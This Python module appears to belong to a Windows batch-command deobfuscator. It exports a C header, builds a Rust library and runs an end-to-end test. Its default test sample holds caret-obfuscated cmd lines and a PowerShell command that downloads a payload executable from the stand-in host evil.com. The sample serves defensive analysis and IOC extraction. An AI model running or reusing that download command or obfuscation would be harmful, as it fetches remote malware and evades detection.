"""
Standalone Deployment, C Header Exporter, and FFI Roundtrip Verification Suite.

Provides helpers to export C ABI headers, build native cdylib binaries, and
execute end-to-end roundtrip verification between C ABI and Python AST engines.
"""

import os
import shutil
import subprocess
import sys
from typing import Any, Dict, Optional

from .models import (
    FFIStatusCode,
    FFIFlags,
    FFIOptions,
    FFIResult,
    zeroize_buffer,
)
from .bridge import CmdDeobfuscatorBridge
from .c_api import find_cdylib_path


DEFAULT_SAMPLE = (
    "@echo off\n"
    "s^e^t p^a^t^h_v^a^r=c^m^d.e^x^e\n"
    "c\"\"m\"\"d.e^x^e /c echo Pwnd\n"
    "powershell -c (New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe')\n"
)


def export_c_header(target_path: Optional[str] = None) -> str:
    """
    Exports or copies the C ABI header (include/cmd_deobfuscator.h)
    to the designated destination path.
    """
    root_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
    src_header = os.path.join(root_dir, "include", "cmd_deobfuscator.h")

    if not os.path.isfile(src_header):
        raise FileNotFoundError(f"Source C ABI header not found at: {src_header}")

    if not target_path:
        return src_header

    out_path = os.path.abspath(target_path)
    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    shutil.copy2(src_header, out_path)
    return out_path


def build_native_library(release: bool = True) -> Dict[str, Any]:
    """
    Invokes `cargo build` to compile the Rust cdylib and rlib artifacts.
    """
    root_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
    cmd = ["cargo", "build"]
    if release:
        cmd.append("--release")

    try:
        proc = subprocess.run(
            cmd,
            cwd=root_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        lib_path = find_cdylib_path()
        return {
            "success": proc.returncode == 0,
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "library_path": lib_path,
        }
    except Exception as e:
        return {
            "success": False,
            "returncode": -1,
            "error": str(e),
            "library_path": None,
        }


def verify_roundtrip(
    sample_input: Optional[str] = None,
    force_python: bool = False,
) -> Dict[str, Any]:
    """
    Executes a complete C ABI / FFI round-trip verification across
    deobfuscation, AST parsing, IOC extraction, and memory zeroization.
    """
    sample = sample_input or DEFAULT_SAMPLE
    bridge = CmdDeobfuscatorBridge(force_python=force_python)

    # 1. Deobfuscation test
    deob_res = bridge.deobfuscate(sample, flags=FFIFlags.ALL_OPTIMIZATIONS)

    # 2. IOC extraction test
    ioc_res = bridge.extract_iocs(sample, flags=FFIFlags.DEFANG_IOCS)

    # 3. AST parsing test
    ast_res = bridge.parse_ast(sample)

    # 4. Memory Zeroize test
    sec_buffer = bytearray(b"SENSITIVE_BATCH_KEY_12345")
    zeroize_buffer(sec_buffer)
    zeroize_ok = all(b == 0 for b in sec_buffer)

    all_passed = (
        deob_res.is_ok
        and ioc_res.is_ok
        and ast_res.is_ok
        and zeroize_ok
        and len(deob_res.text) > 0
    )

    return {
        "status": "PASS" if all_passed else "FAIL",
        "is_native_accelerated": bridge.is_native_accelerated,
        "library_path": bridge.native_library_path,
        "version": bridge.get_version(),
        "zeroize_verified": zeroize_ok,
        "deobfuscation": {
            "status": deob_res.status.name,
            "length": deob_res.length,
            "elapsed_ms": deob_res.metrics.to_dict()["elapsed_ms"],
            "entropy_shift": f"{deob_res.metrics.entropy_initial:.4f} -> {deob_res.metrics.entropy_final:.4f}",
            "text_sample": deob_res.text.strip().splitlines()[:3],
        },
        "iocs": {
            "status": ioc_res.status.name,
            "count": ioc_res.metrics.iocs_extracted,
            "json_sample": ioc_res.text[:100],
        },
        "ast": {
            "status": ast_res.status.name,
            "json_length": ast_res.length,
        },
    }
